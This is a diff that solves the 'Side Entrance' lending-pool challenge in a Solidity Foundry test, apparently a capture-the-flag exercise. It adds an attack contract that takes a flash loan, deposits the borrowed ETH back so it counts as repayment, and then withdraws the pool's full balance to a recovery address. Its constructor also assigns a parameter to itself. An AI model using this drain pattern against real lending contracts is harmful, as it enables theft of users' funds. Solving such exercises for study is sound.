@@ -44,7 +44,11 @@ contract SideEntranceChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_sideEntrance() public checkSolvedByPlayer {}
+    function test_sideEntrance() public checkSolvedByPlayer {
+        AttackContract attackContract = new AttackContract(address(pool), recovery);
+        attackContract.callFlashloan();
+        attackContract.withdraw(payable(recovery));
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -52,5 +56,67 @@ contract SideEntranceChallenge is Test {
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+    }
+}
+
+contract AttackContract {
+    address public owner;
+    address public recovery;
+
+    SideEntranceLenderPool public pool;
+
+    constructor(address poolAddress, address recovery) {
+        owner = msg.sender;
+        pool = SideEntranceLenderPool(poolAddress);
+        recovery = recovery;
+    }
+
+    // fallback() external payable {
+    //     pool.deposit{value: address(this).balance}();
+    //     // require(false, "Fallback trigerred");
+    //     require(pool.balances(address(this)) == 1000e18, "Failed to reflect in deposit amount");
+    //     require(address(pool).balance == 1000e18, "Failed to repay flash loan");
+    //     require(address(this).balance == 0, "AttackContract still has ETH");
+    // }
+
+    function execute() external payable {
+        pool.deposit{value: address(this).balance}();
+        // require(false, "Fallback trigerred");
+        require(pool.balances(address(this)) == 1000e18, "Failed to reflect in deposit amount");
+        require(address(pool).balance == 1000e18, "Failed to repay flash loan");
+        require(address(this).balance == 0, "AttackContract still has ETH");
+    }
+
+    function callFlashloan() external {
+        require(msg.sender == owner, "AttackContract: Only owner can call");
+        pool.flashLoan(address(pool).balance);
+    }
+
+    // function withdraw(address payable receiver) external {
+    //     require(msg.sender == owner, "AttackContract: Only owner can call");
+    //     // require(false, "Withdraw trigerred");
+    //     pool.withdraw();
+    //     require(address(pool).balance == 0, "Failed to withdraw ETH, Pool still has ETH");
+    //     require(address(this).balance == 1000e18, "Failed to withdraw ETH, AttackContract has no ETH");
+    //     receiver.transfer(address(this).balance);
+    // }
+    function withdraw(address payable receiver) public {
+        // require(msg.sender == owner, "AttackContract: Only owner can call");
+
+        // uint256 poolBalanceBefore = address(pool).balance;
+        // uint256 attackContractBalanceBefore = address(this).balance;
+
+        require(pool.balances(address(this)) == 1000e18, "Withdrawable amount in pool not reflected");
+        require(address(pool).balance == 1000e18, "Pool don't have balance to withdraw");
+        pool.withdraw();
+        require(address(this).balance > 0, "Funds wasn't withdrew to AttackContract");
+
+        // require(address(pool).balance == 0, "Failed to withdraw ETH, Pool still has ETH");
+        // require(address(this).balance == poolBalanceBefore, "Failed to withdraw correct amount of ETH");
+
+        receiver.transfer(address(this).balance);
+    }
+
+    receive() external payable {
     }
 }
